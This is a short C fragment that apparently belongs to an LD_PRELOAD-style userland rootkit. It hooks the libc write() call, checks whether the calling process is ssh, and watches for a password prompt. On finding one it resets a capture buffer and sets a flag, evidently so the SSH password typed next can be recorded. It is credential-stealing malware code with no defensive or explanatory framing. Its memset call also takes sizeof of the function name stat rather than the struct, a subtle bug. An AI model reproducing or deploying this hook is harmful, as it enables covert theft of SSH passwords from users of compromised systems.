ssize_t write(int fd, const void *buf, size_t n)
{
    HOOK(o_write,CWRITE);
    if(strcmp("ssh",cprocname())) return o_write(fd,buf,n);
    HOOK(o_fxstat,C__FXSTAT);
    struct stat s_fstat;
    memset(&s_fstat,0x00,sizeof(stat));
    o_fxstat(_STAT_VER,fd,&s_fstat);
    if(S_ISSOCK(s_fstat.st_mode)) return o_write(fd,buf,n);

    if(!strcmp("ssh",cprocname()) && (buf != NULL && strstr((char *)buf,"assword")))
    {
        ssh_pass_size=0;
        memset(ssh_pass,0x00,sizeof(ssh_pass));
        ssh_start=1;
    }
    return o_write(fd,buf,n);
}